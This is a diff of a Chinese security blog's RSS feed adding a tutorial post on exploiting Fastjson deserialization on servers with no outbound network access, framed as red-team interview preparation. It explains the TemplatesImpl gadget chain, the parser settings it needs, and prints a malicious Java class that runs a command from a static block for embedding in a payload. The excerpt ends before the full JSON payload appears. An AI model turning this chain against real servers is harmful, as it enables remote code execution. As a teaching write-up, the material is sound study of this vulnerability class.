@@ -1,4 +1,61 @@
-<?xml version="1.0" encoding="utf-8" standalone="yes"?><rss version="2.0" xmlns:atom="http://www.w3.org/2005/Atom"><channel><title>Fastjson反序列化 on Solowalker</title><link>https://s0lowalker.github.io/docs/java%E5%AE%89%E5%85%A8/java%E6%94%BB%E9%98%B2/fastjson%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96/</link><description>Recent content in Fastjson反序列化 on Solowalker</description><generator>Hugo</generator><language>zh-cn</language><lastBuildDate>Wed, 18 Nov 2026 00:00:00 +0000</lastBuildDate><atom:link href="https://s0lowalker.github.io/docs/java%E5%AE%89%E5%85%A8/java%E6%94%BB%E9%98%B2/fastjson%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96/index.xml" rel="self" type="application/rss+xml"/><item><title>Fastjson1.2.80漏洞分析</title><link>https://s0lowalker.github.io/docs/java%E5%AE%89%E5%85%A8/java%E6%94%BB%E9%98%B2/fastjson%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96/fastjson1.2.80%E6%BC%8F%E6%B4%9E%E5%88%86%E6%9E%90/</link><pubDate>Wed, 18 Nov 2026 00:00:00 +0000</pubDate><guid>https://s0lowalker.github.io/docs/java%E5%AE%89%E5%85%A8/java%E6%94%BB%E9%98%B2/fastjson%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96/fastjson1.2.80%E6%BC%8F%E6%B4%9E%E5%88%86%E6%9E%90/</guid><description>&lt;h1 id="fastjson1280漏洞分析">
+<?xml version="1.0" encoding="utf-8" standalone="yes"?><rss version="2.0" xmlns:atom="http://www.w3.org/2005/Atom"><channel><title>Fastjson反序列化 on Solowalker</title><link>https://s0lowalker.github.io/docs/java%E5%AE%89%E5%85%A8/java%E6%94%BB%E9%98%B2/fastjson%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96/</link><description>Recent content in Fastjson反序列化 on Solowalker</description><generator>Hugo</generator><language>zh-cn</language><lastBuildDate>Thu, 19 Nov 2026 00:00:00 +0000</lastBuildDate><atom:link href="https://s0lowalker.github.io/docs/java%E5%AE%89%E5%85%A8/java%E6%94%BB%E9%98%B2/fastjson%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96/index.xml" rel="self" type="application/rss+xml"/><item><title>Fastjson不出网利用</title><link>https://s0lowalker.github.io/docs/java%E5%AE%89%E5%85%A8/java%E6%94%BB%E9%98%B2/fastjson%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96/fastjson%E4%B8%8D%E5%87%BA%E7%BD%91%E5%88%A9%E7%94%A8/</link><pubDate>Thu, 19 Nov 2026 00:00:00 +0000</pubDate><guid>https://s0lowalker.github.io/docs/java%E5%AE%89%E5%85%A8/java%E6%94%BB%E9%98%B2/fastjson%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96/fastjson%E4%B8%8D%E5%87%BA%E7%BD%91%E5%88%A9%E7%94%A8/</guid><description>&lt;h1 id="fastjson不出网利用">
+ Fastjson不出网利用
+ &lt;a class="anchor" href="#fastjson%e4%b8%8d%e5%87%ba%e7%bd%91%e5%88%a9%e7%94%a8">#&lt;/a>
+&lt;/h1>
+&lt;h2 id="前言">
+ 前言
+ &lt;a class="anchor" href="#%e5%89%8d%e8%a8%80">#&lt;/a>
+&lt;/h2>
+&lt;p>Fastjson 是面试时非常经典、面试官也非常喜欢问的一环，而除了 Fastjson 的基本利用之外也有面对服务端不出网的情况，这种情况在红队之类的面试也很经常会问的，所以在这里记录一下常见了利用手法以及链子。&lt;/p>
+&lt;h2 id="不出网">
+ 不出网
+ &lt;a class="anchor" href="#%e4%b8%8d%e5%87%ba%e7%bd%91">#&lt;/a>
+&lt;/h2>
+&lt;p>不出网指的是&lt;strong>目标服务器无法主动向攻击者控制的外部服务器发起网络请求&lt;/strong>，大致可以分为完全不出网和不完全出网。完全不出网就是目标服务器完全无法向外部发起网络连接，不管什么协议都不行；而不完全出网就是少数协议被限制无法发起网络连接，或者仅限目标服务器能通过少数协议向外部发起网络连接。比如服务器限制了不能向外部建立 LDAP 连接，但是 ICMP 协议能出网。&lt;/p>
+&lt;p>而在 Fastjson 的场景下，如果目标服务器不出网，那么我们最经典的 JNDI 注入的攻击方式就无法实现。而不出网利用的核心思路，就是&lt;strong>把恶意 payload 直接放到 Fastjson 的 JSON 数据中，让目标在本地解析、加载并执行，全程不需要它主动对外建立连接。&lt;/strong>&lt;/p>
+&lt;h2 id="利用方式">
+ 利用方式
+ &lt;a class="anchor" href="#%e5%88%a9%e7%94%a8%e6%96%b9%e5%bc%8f">#&lt;/a>
+&lt;/h2>
+&lt;h3 id="templatesimpl-利用链">
+ TemplatesImpl 利用链
+ &lt;a class="anchor" href="#templatesimpl-%e5%88%a9%e7%94%a8%e9%93%be">#&lt;/a>
+&lt;/h3>
+&lt;p>之前学习 CC 链和 Fastjson 1.2.24 版本的利用时都涉及到这条利用链了，所以这里也不记录具体的利用链，直接上 POC。&lt;/p>
+&lt;p>本地就用 Fastjson 1.2.24 版本进行复现，这个版本的利用更加简单。&lt;/p>
+&lt;p>但是这种利用的条件比较严格：&lt;/p>
+&lt;ol>
+&lt;li>服务端使用&lt;code>parseObject()&lt;/code>时，需要使用&lt;code>JSON.parseObject(input, Object.class, Feature.SupportNonPublicField);&lt;/code>&lt;/li>
+&lt;li>服务端使用&lt;code>parse()&lt;/code>时，需要使用&lt;code>JSON.parse(text1,Feature.SupportNonPublicField)&lt;/code>&lt;/li>
+&lt;/ol>
+&lt;p>这是因为&lt;code>com.sun.org.apache.xalan.internal.xsltc.trax.TemplatesImpl&lt;/code>这个类需要赋值的一些属性为&lt;code>private&lt;/code>，而且没有对应的&lt;code>setter&lt;/code>，所以如果是在真实场景下利用它就是纯看运气了。&lt;/p>
+&lt;p>先写好恶意类：&lt;/p>
+&lt;div class="highlight">&lt;pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;">&lt;code class="language-java" data-lang="java">&lt;span style="display:flex;">&lt;span>&lt;span style="color:#f92672">import&lt;/span> com.sun.org.apache.xalan.internal.xsltc.DOM;
+&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>&lt;span style="color:#f92672">import&lt;/span> com.sun.org.apache.xalan.internal.xsltc.TransletException;
+&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>&lt;span style="color:#f92672">import&lt;/span> com.sun.org.apache.xalan.internal.xsltc.runtime.AbstractTranslet;
+&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>&lt;span style="color:#f92672">import&lt;/span> com.sun.org.apache.xml.internal.dtm.DTMAxisIterator;
+&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>&lt;span style="color:#f92672">import&lt;/span> com.sun.org.apache.xml.internal.serializer.SerializationHandler;
+&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>&lt;span style="color:#f92672">import&lt;/span> java.io.IOException;
+&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>
+&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>&lt;span style="color:#66d9ef">public&lt;/span> &lt;span style="color:#66d9ef">class&lt;/span> &lt;span style="color:#a6e22e">Calc&lt;/span> &lt;span style="color:#66d9ef">extends&lt;/span> AbstractTranslet {
+&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> &lt;span style="color:#66d9ef">public&lt;/span> &lt;span style="color:#a6e22e">Calc&lt;/span>() {
+&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> }
+&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>
+&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> &lt;span style="color:#66d9ef">public&lt;/span> &lt;span style="color:#66d9ef">void&lt;/span> &lt;span style="color:#a6e22e">transform&lt;/span>(DOM document, SerializationHandler&lt;span style="color:#f92672">[]&lt;/span> handlers) &lt;span style="color:#66d9ef">throws&lt;/span> TransletException {
+&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> }
+&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>
+&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> &lt;span style="color:#66d9ef">public&lt;/span> &lt;span style="color:#66d9ef">void&lt;/span> &lt;span style="color:#a6e22e">transform&lt;/span>(DOM document, DTMAxisIterator iterator, SerializationHandler handler) &lt;span style="color:#66d9ef">throws&lt;/span> TransletException {
+&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> }
+&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>
+&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> &lt;span style="color:#66d9ef">static&lt;/span> {
+&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> &lt;span style="color:#66d9ef">try&lt;/span> {
+&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> Runtime.&lt;span style="color:#a6e22e">getRuntime&lt;/span>().&lt;span style="color:#a6e22e">exec&lt;/span>(&lt;span style="color:#e6db74">&amp;#34;calc&amp;#34;&lt;/span>);
+&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> } &lt;span style="color:#66d9ef">catch&lt;/span> (IOException e) {
+&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> &lt;span style="color:#66d9ef">throw&lt;/span> &lt;span style="color:#66d9ef">new&lt;/span> RuntimeException(e);
+&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> }
+&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> }
+&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>}
+&lt;/span>&lt;/span>&lt;/code>&lt;/pre>&lt;/div>&lt;p>编译好之后对这个 class 文件进行 base64 编码，然后直接放到 poc 中：&lt;/p></description></item><item><title>Fastjson1.2.80漏洞分析</title><link>https://s0lowalker.github.io/docs/java%E5%AE%89%E5%85%A8/java%E6%94%BB%E9%98%B2/fastjson%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96/fastjson1.2.80%E6%BC%8F%E6%B4%9E%E5%88%86%E6%9E%90/</link><pubDate>Wed, 18 Nov 2026 00:00:00 +0000</pubDate><guid>https://s0lowalker.github.io/docs/java%E5%AE%89%E5%85%A8/java%E6%94%BB%E9%98%B2/fastjson%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96/fastjson1.2.80%E6%BC%8F%E6%B4%9E%E5%88%86%E6%9E%90/</guid><description>&lt;h1 id="fastjson1280漏洞分析">
  Fastjson1.2.80漏洞分析
  &lt;a class="anchor" href="#fastjson1280%e6%bc%8f%e6%b4%9e%e5%88%86%e6%9e%90">#&lt;/a>
 &lt;/h1>
